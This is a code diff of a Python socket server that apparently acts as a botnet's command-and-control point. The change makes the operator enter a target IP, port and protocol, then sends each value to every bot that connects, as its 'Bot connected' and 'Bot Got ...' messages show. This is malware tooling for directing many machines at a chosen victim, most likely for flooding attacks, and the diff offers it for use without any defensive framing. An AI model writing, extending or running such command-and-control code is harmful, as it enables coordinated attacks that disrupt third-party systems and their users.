@@ -6,21 +6,45 @@ s.bind(("", port))
 print(f'socket binded to port{port}')
 s.listen()
 print('Socket is listening')
-hostname = input("IP:")
-#hostport = input("Port:")
-#proto = input("Protocol:")
-#x = True
+hostname = str("")
+hostport = int(0)
+proto = str("")
+x = True
 while True:
     c, addr = s.accept()
-    c.send(hostname.encode())
-    c.close()
-    print('Bot connected from', addr)
-    #c, addr = s.accept()
-    #c.send(hostport.encode())
-    #c.close()
+    print(addr, ":Bot connected")
+    if x == True:
+        hostname = input("IP:")
+        c.send(hostname.encode())
+        print(addr, "Bot Got Hostname/IP")
+        c.close()
 
-    #c, addr = s.accept()
-    #c.send(proto.encode())
-    #c.close()
-    #print('Bot connected from', addr)
-    
+        hostport = input("Port:")
+        c, addr = s.accept()
+        c.send(hostport.encode())
+        print(addr, "Bot Got Port")
+        c.close()
+
+        proto = input("Protocol:")
+        c, addr = s.accept()
+        c.send(proto.encode())
+        print(addr, "Bot Got Protocol")
+        c.close()
+
+        x = False
+    c, addr = s.accept()
+    c.send(hostname.encode())
+    print(addr, "Bot Got Hostname/IP")
+    c.close()
+
+    c, addr = s.accept()
+    c.send(hostport.encode())
+    print(addr, "Bot Got Port")
+    c.close()
+
+    c, addr = s.accept()
+    c.send(proto.encode())
+    print(addr, "Bot Got Protocol")
+    c.close()
+
+
